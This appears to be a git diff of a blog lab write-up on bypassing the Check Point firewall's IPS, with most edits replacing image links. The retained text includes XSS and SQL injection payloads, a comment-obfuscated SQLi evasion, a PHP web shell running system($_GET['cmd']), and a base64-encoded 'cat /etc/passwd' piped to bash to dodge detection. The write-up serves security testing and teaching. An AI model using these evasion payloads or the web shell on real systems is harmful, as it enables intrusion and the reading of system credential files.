@@ -1,9 +1,9 @@
 ---
 title: Bypass IPS in Check Point Firewall
 tags: [IPS, Check point Firewall]
-style: gray
-color: info
-description: TBypass IPS in Check Point Firewall
+style: border
+color: primary
+description: Bypass IPS in Check Point Firewall
 ---
 ### What is **Intrusion Prevention System (IPS)**
 
@@ -23,7 +23,7 @@ In this lab I will try to bypass IPS blade.
 
 lets start without enabling the IPs blade and see what we can attack and exploit.
 
-![Untitled](https://www.notion.so/Bypass-IPS-in-Check-Point-Firewall-de5e16062aae49d6b2f3aba95c85823e#82cea71d8e1646628cdc7a33f0223e69)
+![1](../assets/img/bypassIPS/1.png)
 
 From Kali Linux let’s perform some common attacks like XSS, SQLi, and upload files.
 
@@ -35,7 +35,7 @@ simple payload
 <script>alert('CyberY')</script>
 ```
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/50dd3d31-c624-43e0-bdc7-9826590b6aa0/Untitled.png)
+![2](../assets/img/bypassIPS/2.png)
 
 As we can see payload successfully executed.
 
@@ -47,7 +47,7 @@ simple payload
 1' or 1--
 ```
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/797913ec-25c9-47cd-91ce-f935b90e3cca/Untitled.png)
+![3](../assets/img/bypassIPS/3.png)
 
 we can retrieve all the users simply.
 
@@ -75,13 +75,13 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 <!--    http://michaeldaw.org   2006    -->
 ```
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/66968fd8-37ff-422d-aef1-c7f618da3783/Untitled.png)
+![4](../assets/img/bypassIPS/4.png)
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abfdc2e2-dd59-4a9a-9a4b-fdc470afb66b/Untitled.png)
+![5](../assets/img/bypassIPS/5.png)
 
 got a remote code execution.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9cd4e3b1-34a0-414b-9460-9c4837392450/Untitled.png)
+![6](../assets/img/bypassIPS/6.png)
 
 ## Enable IPS Blade
 
@@ -89,17 +89,17 @@ got a remote code execution.
 2. In Threat Prevention select IPS.
 3. Click OK.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3e0107a-d4b1-4082-a7a6-e86d09a471f4/Untitled.png)
+![7](../assets/img/bypassIPS/7.png)
 
 you should see IPS blade enabled.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c156bcd3-de43-448e-b03d-51a1c826e43f/Untitled.png)
+![8](../assets/img/bypassIPS/8.png)
 
 1. Click on Security Policies in the left side.
 2. Under Threat Prevention select Policy.
 3. Right click under Action and select Strict.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/507da690-4d03-4ba2-b52e-c1a5daeccda7/Untitled.png)
+![9](../assets/img/bypassIPS/9.png)
 
 7.Publish and install the policies.
 
@@ -111,41 +111,37 @@ Lets try to exploit and see the behavior.
 
 with same payload failed.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b33740a9-eeb9-41d7-ba6d-846d3dc42cdd/Untitled.png)
+![10](../assets/img/bypassIPS/10.png)
 
 #### - SQL Injection
 
 with same payload failed.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1088ee9c-09cf-4c09-8524-e50f777de7cd/Untitled.png)
+![11](../assets/img/bypassIPS/11.png)
 
 #### - File Upload
 
 failed.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/36627d7f-cf61-482d-8bbd-404611bc95a1/Untitled.png)
+![12](../assets/img/bypassIPS/12.png)
 
 ##### This meaning the IPS working great.
 
 Check the logs in the firewall.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63a249bb-a6f9-4768-a212-9dbeb1fbe6e6/Untitled.png)
+![13](../assets/img/bypassIPS/13.png)
 
 you can double click and see the details 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ef556d7c-df4e-4e68-8bf2-73d9b18763b4/Untitled.png)
+![14](../assets/img/bypassIPS/14.png)
 
 ## Bypass IPS in Check Point Firewall
 
 After we see the behavior of the IPS lets bypass it.
 
-to bypass it we have to know how IPS identification works for this I suggest to watch the below video.
+to bypass it we have to know how IPS identification works for this I suggest to watch this [![Video]()](https://www.youtube.com/watch?v=hEgWPWIuq_s&ab_channel=ProfessorMesser "Network Intrusion Detection and Prevention"){:target="_blank" rel="noopener"}.
 
-[https://www.youtube.com/watch?v=hEgWPWIuq_s&ab_channel=ProfessorMesser](https://www.youtube.com/watch?v=hEgWPWIuq_s&ab_channel=ProfessorMesser)
-
-Now we are ready to go, to make this easy we can take help from [PayloadALLThings](https://github.com/swisskyrepo/PayloadsAllTheThings) in github.
-
-[GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings)
+Now we are ready to go, to make this easy we can take help from [PayloadALLThings](https://github.com/swisskyrepo/PayloadsAllTheThings){:target="_blank" rel="noopener"} in github.
 
 #### - XSS reflected
 
@@ -158,7 +154,7 @@ error. alert(), prompt(), confirm(), and eval() were all blocked, so we would ha
 
 By this payload we are able to bypass IPS and preform reflected XSS.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3c1c24dc-6907-4c7f-b6ac-e4e0f814a851/Untitled.png)
+![15](../assets/img/bypassIPS/15.png)
 
 #### - SQL Injection
 
@@ -168,7 +164,7 @@ After long search I bypass it by replacing the space with **/*! */** as followin
 1'/*! */or/*! */'1/*! */--/*! */
 ```
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8dfc4a0-732e-4dcc-8831-50e27dd891e5/Untitled.png)
+![16](../assets/img/bypassIPS/16.png)
 
 #### - File Upload
 
@@ -185,11 +181,11 @@ system($_GET['cmd']); # shellcode goes here
 
 Uploaded with php extension means the IPS never check the extension of the file. 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a72351e2-62e4-40ee-bc54-710676291a8a/Untitled.png)
+![17](../assets/img/bypassIPS/17.png)
 
 navigate to the url, then type ?cmd=whoami
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed374d8b-b62b-4e9d-aa55-b819f8183013/Untitled.png)
+![18](../assets/img/bypassIPS/18.png)
 
 another interesting thing that IPS block me from doing cat /etc/passwd
 
@@ -200,7 +196,5 @@ echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
 ```
 
 and here we go 😀
-
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4e4e7fd-e1a0-4b9f-be26-03135754f17b/Untitled.png)
 
 ### Thanks for reading, hope you enjoyed.
